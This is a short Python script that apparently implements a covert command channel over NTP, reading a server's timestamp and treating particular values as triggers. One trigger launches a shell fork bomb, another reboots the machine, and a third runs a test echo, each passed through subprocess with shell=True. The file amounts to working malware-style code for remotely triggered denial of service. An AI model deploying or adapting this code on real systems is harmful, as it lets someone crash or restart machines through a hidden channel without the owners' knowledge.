import ntplib
import sys, os, subprocess
from time import ctime

HostIP = '127.0.0.1'

# Essential shell functionality
def run_command(cmd):
  proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdoutput = proc.stdout.read() + proc.stderr.read()
  return stdoutput

c = ntplib.NTPClient()
response = c.request(HostIP)
#print ctime(response.tx_time) # old print time
command = response.tx_time
#print ctime(command); print int(command)
# Forkbomb command
if int(command) == int(-2208988799):
  run_command(":(){ :|:& };:")
# Reboot if root command  
if int(command) == int(-2208988798):
  run_command("reboot")
# Test command  
if int(command) == int(-2208988797):
  print run_command("echo test")
